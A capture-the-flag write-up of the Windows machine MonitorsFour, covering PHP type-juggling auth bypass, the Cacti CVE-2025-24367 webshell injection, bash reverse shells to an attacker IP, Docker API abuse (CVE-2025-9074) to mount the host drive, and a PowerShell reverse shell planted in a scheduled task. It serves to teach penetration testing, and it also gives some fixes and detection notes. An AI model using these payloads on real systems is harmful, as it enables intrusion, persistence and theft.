[🏠 Main Site](https://motasem-notes.net/) · [🛒 Store](https://shop.motasem-notes.net/) · [▶ YouTube](https://www.youtube.com/@MotasemHamdan) · [☕ Membership](https://buymeacoffee.com/notescatalog/membership)

> Practitioner-grade cybersecurity notes, cert prep guides, and courses. All premium notes available at **[buymeacoffee.com/notescatalog/extras](https://buymeacoffee.com/notescatalog/extras)** or [shop.motasem-notes.net](https://shop.motasem-notes.net)

> *Difficulty:** Easy | **OS:** Windows (Server 2025 / Windows 11 Build 26100) | **Released:** 06 Dec 2025 | **Retired:** 23 May 2026 **Creators:** TheCyberGeek, kavigihan | **Series:** Monitors (4th entry)

---

## Box Summary

MonitorsFour is the fourth entry in the Monitors series, this time on a Windows host running Docker Desktop with a WSL2 backend. The full attack chain is:

1. Enumerate — nmap finds port 80 (Nginx/PHP) and 5985 (WinRM); subdomain brute-force finds `cacti.monitorsfour.htb`
2. Discover a `.env` file and a `/user` API endpoint on the main site
3. Exploit **PHP type juggling** (`==` vs `===`) — sending `token=0` bypasses auth and dumps all user records including MD5 password hashes
4. Crack hashes via CrackStation — `admin:wonderful1` (reused as `marcus:wonderful1` on Cacti)
5. Log into Cacti 1.2.28 as `marcus`; exploit **CVE-2025-24367** — newline injection into `rrdtool` via the `right_axis_label` field writes an arbitrary PHP webshell → shell as `www-data` inside a Docker container
6. From the container, enumerate and reach the Docker Engine API at `192.168.65.7:2375` — this is exposed via **CVE-2025-9074** (Docker Desktop < 4.44.3 allows containers to reach the Engine API)
7. Use the unauthenticated Docker API to create a new container that mounts the Windows `C:\` drive and issue a reverse shell command → root/SYSTEM on the WSL2 host
8. Beyond Root: append a PowerShell reverse shell to the Administrator's `container_cleanup.ps1` scheduled task (runs every 3 minutes) → interactive Windows Administrator shell

---

## 01 · Recon

### Nmap

```bash
sudo nmap -p- --min-rate 10000 monitorsfour.htb
sudo nmap -p 80,5985 -sCV 10.129.67.15
```

**Open ports:**

|Port|Service|Notes|
|---|---|---|
|80|HTTP|nginx — redirects to `monitorsfour.htb`|
|5985|WinRM|Microsoft HTTPAPI/2.0|

TTL of 127 confirms Windows one hop away. Port 443 and 8080 return `closed` (not `filtered`) — an active firewall is explicitly resetting those connections rather than silently dropping them.

### OS and Hostname via netexec

```bash
netexec winrm 10.129.67.15
# MONITORSFOUR  Windows 11 / Server 2025 Build 26100
# name: MONITORSFOUR  domain: MonitorsFour
```

No `.` in the domain name and the name matching the domain confirms this is a standalone workstation, not domain-joined.

### Subdomain Brute Force

```bash
ffuf -u http://10.129.67.15 \
  -H 'Host: FUZZ.monitorsfour.htb' \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
# cacti  [Status: 302, Size: 0]
```

```bash
# Update /etc/hosts
echo "10.129.67.15 monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

---

## 02 · monitorsfour.htb — Enumeration

### Tech Stack

Response headers reveal Nginx + PHP 8.3.27 and set a `PHPSESSID` cookie. The application uses a custom PHP framework with MVC routing. The directory structure exposed by `feroxbuster` shows:

```
/user            → API endpoint (returns error without token param)
/contact         → crashes with PHP exception (leaks web root path)
/login           → login form
/forgot-password → forgot password form
/controllers/    → PHP controller files (301)
/views/          → view templates (301)
/static/         → static assets (301)
```

The `/contact` crash message leaks the full filesystem path to the web root on the Windows host — useful for understanding where files land.

### .env File Exposure

The `.env` file is accessible without authentication — a common misconfiguration when development files are not excluded from the web root:

```bash
curl http://monitorsfour.htb/.env
# DB_HOST=mariadb
# DB_PORT=3306
# DB_NAME=monitorsfour_db
# DB_USER=monitorsdbuser
# DB_PASS=f37p2j8f4t0r
```

These DB credentials do not work on the login form or over WinRM — the application authenticates users from the database but the `monitorsdbuser` account is not a system user.

### /user API Endpoint

`GET /user` without a `token` parameter returns an error. Fuzzing the `token` parameter with `ffuf` against a short alphanumeric-plus-extras wordlist (`alphanum-case-extra.txt`) reveals that the value `0` produces a different, larger response — it dumps all users:

```bash
ffuf -u 'http://monitorsfour.htb/user?token=FUZZ' \
  -w /opt/SecLists/Fuzzing/alphanum-case-extra.txt -ac
# 0 → [Status: 200, Size: 1113]
```

```bash
curl http://monitorsfour.htb/user?token=0 -s | jq .
```

**All four users returned:**

|Username|Password hash (MD5)|Role|Full name|
|---|---|---|---|
|`admin`|`56b32eb43e6f15395f6c46c1c9e1cd36`|super user|Marcus Higgins|
|`mwatson`|`69196959c16b26ef00b77d82cf6eb169`|user|Michael Watson|
|`janderson`|`2a22dcf99190c322d974c8df5ba3256b`|user|Jennifer Anderson|
|`dthompson`|`8d4a7e7fd08555133e056d9aacb1e519`|user|David Thompson|

The token values for the non-admin users (`0e543210987654321`, `0e999999999999999`, `0e111111111111111`) all follow the `0e...` scientific notation pattern — this is the key to the type juggling bypass, explained in detail in Section 11.

### Crack Password Hashes

All four are 32-character MD5 hashes. Submit to [CrackStation](https://crackstation.net/):

- `admin`: `56b32eb43e6f15395f6c46c1c9e1cd36` → **wonderful1**
- Other hashes do not crack from common wordlists

The `admin` user's full name (from the API dump) is **Marcus Higgins**.

---

## 03 · cacti.monitorsfour.htb — Enumeration

### Cacti Login Page

The Cacti login page is served at `cacti.monitorsfour.htb`. The page footer reveals the version: **1.2.28**.

Response headers:

```
X-Powered-By: PHP/8.3.27
Set-Cookie: Cacti=...; path=/cacti/; HttpOnly; SameSite=Strict
```

### Timing-Based Username Validation

A subtle timing side-channel allows username enumeration on the Cacti login form. Submitting a non-existent username takes 75–110ms (single DB lookup, no matching row → return immediately). Submitting a valid username (`admin`) takes 250–310ms because the DB returns a row and PHP must hash the submitted password using bcrypt before comparing — and bcrypt is intentionally slow.

```
# Non-existent user:  75-110ms response time → user does not exist
# Valid user (admin): 250-310ms response time → user exists, bcrypt hash running
```

Mass fuzzing with `ffuf` is unreliable here because the underpowered server serialises requests, inflating all response times and breaking the filter. Manual checking in Burp Repeater is more reliable.

### Authenticated Login (Cacti)

`wonderful1` does not work directly with username `admin` on Cacti. However, the API dump revealed the admin's full name is **Marcus Higgins** — trying username `marcus` with password `wonderful1` succeeds:

```
marcus : wonderful1  → Cacti login successful
```

---

## 04 · PHP Type Juggling — Auth Bypass → User Dump

### Why `token=0` Works

In PHP, `==` (loose comparison) performs type coercion. A string beginning with `0e` followed only by digits is treated as scientific notation: `0e<anything>` evaluates to `0.0` (i.e., zero). Because `0 == 0e543210987654321` evaluates to `true` in PHP loose comparison, passing `token=0` matches any stored token of the form `0e<digits>`.

The three non-admin users all have tokens in this form (`0e543210987654321`, `0e999999999999999`, `0e111111111111111`). The application code validates the token with `==` instead of `===`, so `0` matches all three.

**PHP loose comparison truth table (relevant cases):**

|Comparison|Result|
|---|---|
|`0 == "0e999"`|`true` — string coerced to float 0.0|
|`0 === "0e999"`|`false` — different types (int vs string)|
|`0 == "0"`|`true`|
|`0 == ""`|`true` — empty string coerces to 0|
|`0 == "admin"`|`true` — non-numeric string coerces to 0 in PHP < 8|

> **Fix:** Replace `==` with `===` for all security-sensitive comparisons, or use `hash_equals()` for constant-time token comparison.

### Source Code Root Cause

```php
// controllers/UserController.php
public function get_users($router) {
    $token = $_GET['token'] ?? null;
    if ($token === null) {       // null check uses ===, so this is fine
        echo json_encode(["error" => "Missing token parameter"]);
        exit;
    }
    $auth = new AuthController();
    if (!$auth->validate_token($token)) {  // validate_token uses == internally
        // returns 403
    }
    // dump all users...
}
```

The `validate_token()` function performs a loose comparison against the stored token values, allowing `0` to match any `0e<digits>` token.

---

## 05 · CVE-2025-24367 — Cacti RCE via rrdtool Injection

### Vulnerability Description

**CVE-2025-24367** (fixed in Cacti 1.2.29):

> An authenticated Cacti user can abuse graph creation and graph template functionality to create arbitrary PHP scripts in the web root of the application, leading to remote code execution.

**Root cause — `cacti_escapeshellarg()` on Windows:**

Cacti's custom `escapeshellarg` for Windows wraps values in double quotes and escapes embedded double quotes, but **never strips or escapes newline characters (`\n`, `\r`)**. When the value is passed to `rrdtool` via a shell command line, a `\n` terminates the current logical command line — breaking the line continuation (`\\\n`) that was keeping the long `rrdtool` invocation on one logical line. Everything after the injected `\n` becomes a new `rrdtool` subcommand.

**Downstream sink:**

`lib/rrd.php` builds `rrdtool graph` commands from graph template fields. The `right_axis_label` field is passed through `cacti_escapeshellarg()` and becomes:

```bash
rrdtool graph filename.png \
  --right-axis-label "<USER_INPUT>" \
  ...
```

If `<USER_INPUT>` contains `\n`, the command becomes:

```bash
rrdtool graph filename.png \
  --right-axis-label "first-line
<INJECTED_RRDTOOL_COMMANDS>
" \
  ...
```

**Writing a webshell:**

The injected commands use `rrdtool create` to make a throwaway RRD database, then `rrdtool graph shell.php -a CSV ... LINE1:out:<?=system(...);?>` to write a CSV-format file named `shell.php` whose content includes attacker-controlled PHP. The file lands in the Cacti web root.

**The fix (1.2.29)** adds `str_replace(["\n", "\r"], "", $string)` at the very start of `cacti_escapeshellarg()`, stripping newlines before either the Unix or Windows branch runs.

### Manual Exploit

**Step 1 — Find an existing graph and open its template:**

In Cacti: `Graphs` tab → find a graph → click "Edit Graph Template".

**Step 2 — Set a marker in Right Axis Label:**

Scroll to "Right Axis Label", enter a known string, submit, then find the request in Burp Repeater.

**Step 3 — Build the injection payload:**

The three lines to inject (one per `\n`):

```
0xdf
create poc.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph shell.php -s now -a CSV DEF:out=poc.rrd:temp:AVERAGE LINE1:out:<?=system(array_values($_REQUEST)[0]);?>

```

> Important: a trailing newline is required. No quotes in the PHP tag — use `array_values($_REQUEST)[0]` instead of `$_GET['cmd']` to avoid quote characters.

**URL-encoded form** (replace the marker in the `right_axis_label` parameter):

```
0xdf%0acreate+poc.rrd+--step+300+DS%3atemp%3aGAUGE%3a600%3a-273%3a5000+RRA%3aAVERAGE%3a0.5%3a1%3a1200%0agraph+shell.php+-s+now+-a+CSV+DEF%3aout%3dpoc.rrd%3atemp%3aAVERAGE+LINE1%3aout%3a<%3f%3dsystem(array_values($_REQUEST)[0])%3b%3f>%0a
```

Burp does not URL-encode newlines with Ctrl+U — replace them manually with `%0a`.

**Step 4 — Trigger the graph render:**

Click "Preview" on the Graphs tab. This causes Cacti to rebuild the graph using `rrdtool`, executing the injected commands.

**Step 5 — Verify webshell:**

```bash
curl 'http://cacti.monitorsfour.htb/cacti/shell.php?c=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Official PoC

TheCyberGeek (co-creator of this box) published a PoC: `https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC`

The script avoids character issues by using a two-step approach — first writing a PHP file that runs `curl` to fetch a payload, then a second file to execute it:

```bash
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
uv run --with requests,beautifulsoup4 exploit.py \
  -u marcus -p wonderful1 \
  -i 10.10.14.61 -l 443 \
  --url http://cacti.monitorsfour.htb
```

> Requires root (or capabilities) to bind the hardcoded HTTP server on port 80.

---

## 06 · Shell as www-data in Container

### Reverse Shell via Webshell

```bash
# Start listener
nc -lnvp 443

# Trigger reverse shell via webshell
curl http://cacti.monitorsfour.htb/cacti/shell.php \
  --data-urlencode 'c=bash -c "bash -i >& /dev/tcp/10.10.14.61/443 0>&1"'
```

```
Connection received on 10.129.67.15 51839
www-data@821fbd6a43fa:~/html/cacti$
```

### Shell Upgrade

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset
# Terminal type? screen
```

---

## 07 · Container Enumeration

### Confirming Docker Container

```bash
cat /.dockerenv      # exists → inside Docker container
hostname             # 821fbd6a43fa (Docker default container hostname)
ip addr              # 172.18.0.3/16 on eth0
```

### Users and Files

```bash
cat /etc/passwd | grep 'sh$'
# root and marcus only have shells

ls /home/marcus/        # world-accessible
cat /home/marcus/user.txt   # user flag readable as www-data

ls -la /var/www/        # app/ (monitorsfour.htb) + html/ (cacti + nginx)
cat /var/www/app/.env   # DB creds: monitorsdbuser:f37p2j8f4t0r (mariadb host)
cat /var/www/html/cacti/include/config.php  # cactidbuser:7pyrf6ly8qx4 (mariadb host)
```

### MariaDB Enumeration

```bash
mariadb -u cactidbuser -p7pyrf6ly8qx4 -h mariadb cacti
```

```sql
select username, password, full_name from user_auth;
-- admin   : $2y$10$wqlo06C4isr4q9xhqI/UQO...  (bcrypt)
-- marcus  : $2y$10$bPWlnZYLhoDUawu4x8vLAu...  (bcrypt → wonderful1 via hashcat)
-- guest   : 43e9a4ab75570f5b              (broken hash, not crackable)
```

### Network Reconnaissance

```bash
getent hosts mariadb    # 172.18.0.2

# Sweep the local /24 for resolvable hosts
seq 1 255 | xargs -I{} -P 255 sh -c 'getent hosts 172.18.0.{}'
# 172.18.0.2  mariadb.docker_setup_default
# 172.18.0.3  821fbd6a43fa (current container)
```

### Critical Discovery — `/etc/resolv.conf`

```
nameserver 127.0.0.11
# ExtServers: [host(192.168.65.7)]
```

The `ExtServers` comment reveals the upstream DNS server at `192.168.65.7`. The `192.168.65.0/24` range is Docker Desktop's standard internal network for Windows/Mac hosts — this confirms the host is running **Docker Desktop on Windows with WSL2 backend**.

The admin panel (visible after logging in as `admin` on the main site) further confirms **Docker Desktop 4.44.2** is installed.

### Port Scan of 192.168.65.7

Upload a static `nmap` binary to scan the Docker Desktop host:

```bash
# Upload static nmap + service files to /tmp
./nmap --datadir /tmp/ -p- --min-rate 10000 192.168.65.7

# Open ports:
# 53   (DNS)
# 2375 (Docker Engine API — unauthenticated!)
# 3128 (HTTP proxy — docker.internal:3128)
# 5555 (Registry mirror — hubproxy.docker.internal:5555)
```

**Port 2375 is the Docker Engine API with no authentication** — this is the exploitation target.

---

## 08 · CVE-2025-9074 — Docker Engine API Exposure

### Vulnerability Description

**CVE-2025-9074** (fixed in Docker Desktop 4.44.3):

> A vulnerability in Docker Desktop allows local running Linux containers to access the Docker Engine API via the configured Docker subnet (192.168.65.7:2375 by default). This occurs with or without Enhanced Container Isolation (ECI) enabled. In Docker Desktop for Windows with WSL2 backend, it also allows mounting the host drive (`C:\`) with full privileges.

The Docker Engine API is a REST API that allows full container lifecycle management — creating, starting, stopping, and deleting containers, listing images, and configuring bind mounts. Without authentication, any process inside any container can use it to create a new privileged container that mounts the Windows host filesystem.

### Verify API Access

```bash
curl 192.168.65.7:2375/info | python3 -m json.tool | grep -E "Kernel|Operating|Server|Containers"
# "KernelVersion": "6.6.87.2-microsoft-standard-WSL2"
# "OperatingSystem": "Docker Desktop"
# "ServerVersion": "28.3.2"
# "Containers": 2
# "ContainersRunning": 2
```

Key findings from `/info`:

- `KernelVersion: microsoft-standard-WSL2` → confirms Docker Desktop on Windows with WSL2
- `Containers: 2, ContainersRunning: 2` → only Cacti and MariaDB containers active
- `Images: 3` → third image (alpine:latest) is available but unused

```bash
# List available images
curl 192.168.65.7:2375/images/json | python3 -m json.tool | grep RepoTags
# "docker_setup-nginx-php:latest"
# "docker_setup-mariadb:latest"
# "alpine:latest"
```

---

## 09 · Root via Docker API — Mount Host Filesystem

### Step 1 — Create the Malicious Container

Send a POST to `/containers/create` with a JSON body specifying:

- `Image`: use the existing `docker_setup-nginx-php:latest` (known to have bash; alpine likely does not)
- `Cmd`: a bash reverse shell
- `HostConfig.Binds`: mount `/mnt/host/c` (the Windows C: drive as exposed to Docker Desktop's WSL2 VM) as `/host_root` inside the new container

```bash
curl -H 'Content-Type: application/json' \
  -d '{"Image":"docker_setup-nginx-php:latest","Cmd":["/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.61/443 0>&1"],"HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}' \
  -o container.json \
  http://192.168.65.7:2375/containers/create

cat container.json
# {"Id":"900987cc8b2650e3f657efb34117607bbc249622c013fec27edbe72fbb210169","Warnings":[]}
```

### Step 2 — Start the Container

```bash
curl -d '' \
  http://192.168.65.7:2375/containers/900987cc8b2650e3f657efb34117607bbc249622c013fec27edbe72fbb210169/start
```

Shell arrives on the listener:

```
Connection received on 10.129.67.15 49176
root@900987cc8b26:/var/www/html#
```

### Step 3 — Access the Windows Filesystem

```bash
ls /host_root
# '$RECYCLE.BIN'  'Program Files'  Users  Windows  ProgramData ...

cat /host_root/Users/Administrator/Desktop/root.txt
# eda0f688************************
```

The `/mnt/host/c` path is Docker Desktop for Windows' standard path to the Windows host's `C:\` drive, exposed to the WSL2 backend. The new container mounts it with the same privileges as the Docker Desktop process, which runs as the logged-in Windows user — in this case `Administrator`.

### Docker API Quick Reference

|Endpoint|Method|Purpose|
|---|---|---|
|`GET /info`|GET|Engine info, version, OS, container counts|
|`GET /images/json`|GET|List all available images|
|`GET /containers/json`|GET|List running containers|
|`POST /containers/create`|POST|Create a container (body: JSON config)|
|`POST /containers/{id}/start`|POST|Start a created container|
|`POST /containers/{id}/stop`|POST|Stop a container|
|`DELETE /containers/{id}`|DELETE|Remove a container|
|`POST /containers/{id}/exec`|POST|Create an exec instance (for interactive commands)|

---

## 10 · Beyond Root — Windows Shell via Scheduled Task

### Enumerate Scheduled Tasks

The `/host_root/Windows/System32/Tasks/` directory contains the scheduled task XML files for the Windows host:

```bash
ls /host_root/Windows/System32/Tasks/
# Clean_Containers       (every 3 minutes, as Administrator)
# Clean_DB               (every 15 minutes, as Administrator)
# Copy_User_File_To_Container  (at boot only)
# StartDockerDesktopCLIOnly    (on logon)
# Microsoft/            (Windows system tasks)
```

**`Clean_Containers`** runs `container_cleanup.ps1` every 3 minutes as `Administrator`. This is the target.

```xml
<Triggers>
  <TimeTrigger>
    <Repetition>
      <Interval>PT3M</Interval>   <!-- every 3 minutes -->
    </Repetition>
    <Enabled>true</Enabled>
  </TimeTrigger>
</Triggers>
<Principals>
  <Principal>
    <UserId>Administrator</UserId>
    <LogonType>Password</LogonType>
  </Principal>
</Principals>
<Actions>
  <Exec>
    <Command>PowerShell.exe</Command>
    <Arguments>-ExecutionPolicy Bypass -File C:\Users\Administrator\Documents\container_cleanup.ps1</Arguments>
  </Exec>
</Actions>
```

### Append Reverse Shell to Script

From inside the root container with `/host_root` mounted:

```bash
# Navigate to the script location
cd /host_root/Users/Administrator/Documents

# Optional: backup the original script
cp container_cleanup.ps1 container_cleanup.ps1.bk

# Generate a PowerShell reverse shell (base64-encoded)
# Use revshells.com → PowerShell #3 Base64 → LHOST=10.10.14.61, LPORT=443

# Append a blank line and the reverse shell to the script
echo >> container_cleanup.ps1
echo 'powershell -e <BASE64_ENCODED_POWERSHELL_REVSHELL>' >> container_cleanup.ps1
```

### Wait for Execution (≤ 3 minutes)

With `rlwrap nc -lnvp 443` listening, wait up to 3 minutes for the scheduled task to fire:

```
Connection received on 10.129.67.15 60908

PS C:\WINDOWS\system32> whoami
monitorsfour\administrator
PS C:\WINDOWS\system32> hostname
MONITORSFOUR
```

### Cleanup

Restore the original script after obtaining the shell:

```bash
cp container_cleanup.ps1.bk container_cleanup.ps1
```

---

## 11 · Beyond Root — PHP Type Juggling Deep Dive

### The Vulnerable Code

```php
// controllers/UserController.php
public function get_users($router) {
    $token = $_GET['token'] ?? null;
    if ($token === null) {       // ✅ strict: correctly rejects null
        echo json_encode(["error" => "Missing token parameter"]);
        exit;
    }
    $auth = new AuthController();
    if (!$auth->validate_token($token)) {  // ❌ validate_token uses ==
        header("Content-Type: application/json");
        http_response_code(403);
        echo json_encode(["error" => "Unauthorized"]);
        exit;
    }
    // ... return all users ...
}
```

Inside `validate_token()` the comparison is likely something like:

```php
function validate_token($input_token) {
    // Fetch the token from DB for any user
    foreach ($users as $user) {
        if ($user['token'] == $input_token) {  // ❌ loose comparison
            return true;
        }
    }
    return false;
}
```

### Why `0` Matches `0e<digits>`

In PHP, when `==` compares a string to an integer (or to another string that looks like a number), it converts both operands to floats. The string `"0e543210987654321"` is parsed as scientific notation: `0 × 10^543210987654321 = 0.0`. Therefore:

```php
0 == "0e543210987654321"   // true  (both become float 0.0)
0 === "0e543210987654321"  // false (different types: int vs string)

// The three user tokens in the database:
// "0e543210987654321" → float 0.0 == int 0 → true
// "0e999999999999999" → float 0.0 == int 0 → true
// "0e111111111111111" → float 0.0 == int 0 → true
```

The `admin` token `8024b78f83f102da4f` is not `0e`-shaped — it contains non-digit characters (`b`, `f`...) so it is treated as a non-numeric string, which coerces to `0` in PHP < 8 but not in PHP 8+. Because the box runs PHP 8.3, the admin token is not matched by `0`. The three non-admin users are matched.

### Defensive Patterns

```php
// ✅ Correct: strict comparison
if ($user['token'] === $input_token) { ... }

// ✅ Correct: constant-time comparison (prevents timing attacks)
if (hash_equals($user['token'], $input_token)) { ... }

// ❌ Wrong: loose comparison
if ($user['token'] == $input_token) { ... }
```

> **Context for token design:** The three non-admin tokens were likely seeded with `0e...` values deliberately to make the type juggling exploit work. In real applications, tokens should be generated with `bin2hex(random_bytes(16))` or `hash_hmac('sha256', ...)` — values that will never start with `0e` followed only by digits.

---

## Key Concepts & Analyst Notes

### PHP Type Juggling in One Table

|Comparison|PHP behavior|Attack implication|
|---|---|---|
|`"0e999" == 0`|`true`|Any `0e<digits>` token matches integer `0`|
|`"0e999" === 0`|`false`|Strict comparison is safe|
|`"admin" == 0`|`true` (PHP < 8)|Non-numeric string coerces to 0 in old PHP|
|`"admin" == 0`|`false` (PHP ≥ 8)|Behavior changed in PHP 8|
|`"" == 0`|`true` (PHP < 8)|Empty string matches 0|
|`null == false`|`true`|Both are falsy|

The safest pattern for any security-sensitive string comparison is `===` or `hash_equals()`.

---

### CVE-2025-24367 Exploitation Pattern

Any time a web application passes user-controlled input through a shell command builder without stripping newlines, the injection vector exists. The specific Cacti chain:

```
authenticated user edits graph template
  → right_axis_label field value stored in DB
  → cacti_escapeshellarg() wraps in quotes but doesn't strip \n
  → rrdtool graph command built with RRD_NL (" \\\n") line continuation
  → \n in user value breaks line continuation
  → remaining text interpreted as new rrdtool commands
  → rrdtool graph -a CSV writes attacker PHP to web root
  → browse to written PHP file → RCE
```

Fix pattern: strip `\n` and `\r` before any shell escaping, not after.

---

### CVE-2025-9074 — Docker Desktop API Exposure Pattern

The attack is reusable in any Docker Desktop installation where:

1. A container is running (compromised via any means)
2. The container has network access to `192.168.65.7:2375` (default Docker Desktop internal network)
3. Docker Desktop for Windows is running with the WSL2 backend

Detection: look for outbound connections from containers to `192.168.65.7:2375`. Mitigation: upgrade to Docker Desktop ≥ 4.44.3 (which binds the API to `127.0.0.1` only within the WSL VM).

```bash
# Detection from inside a container (to check if vulnerable)
curl 192.168.65.7:2375/info 2>/dev/null | grep -q "Docker Desktop" && echo "VULNERABLE"

# Exploitation one-liner (reads root flag)
curl -s -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["cat","/host_root/Users/Administrator/Desktop/root.txt"],"HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}' \
  http://192.168.65.7:2375/containers/create | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['Id'])" | \
  xargs -I{} curl -sd '' "http://192.168.65.7:2375/containers/{}/start"
```

---

### Quick Reference — Key Commands

|Task|Command|
|---|---|
|Subdomain fuzz|`ffuf -u http://<IP> -H 'Host: FUZZ.<domain>' -w <wordlist> -ac`|
|Read exposed .env|`curl http://monitorsfour.htb/.env`|
|Exploit type juggling|`curl 'http://monitorsfour.htb/user?token=0'`|
|CVE-2025-24367 PoC|`uv run --with requests,beautifulsoup4 exploit.py -u marcus -p wonderful1 ...`|
|Execute via webshell|`curl 'http://cacti.../cacti/shell.php?c=id'`|
|Confirm Docker container|`cat /.dockerenv && ip addr`|
|Find ExtServers hint|`cat /etc/resolv.conf \| grep ExtServers`|
|Scan Docker Desktop host|`./nmap --datadir /tmp/ -p- 192.168.65.7`|
|Query Docker API|`curl 192.168.65.7:2375/info`|
|List images|`curl 192.168.65.7:2375/images/json`|
|Create privileged container|`curl -H 'Content-Type: application/json' -d '{"Image":"...","Cmd":[...],"HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}' http://192.168.65.7:2375/containers/create`|
|Start container|`curl -d '' http://192.168.65.7:2375/containers/<ID>/start`|
|Enumerate scheduled tasks|`ls /host_root/Windows/System32/Tasks/`|
|Read task XML|`cat /host_root/Windows/System32/Tasks/Clean_Containers`|
|Append to script|`echo 'powershell -e <B64>' >> /host_root/Users/Administrator/Documents/container_cleanup.ps1`|

---
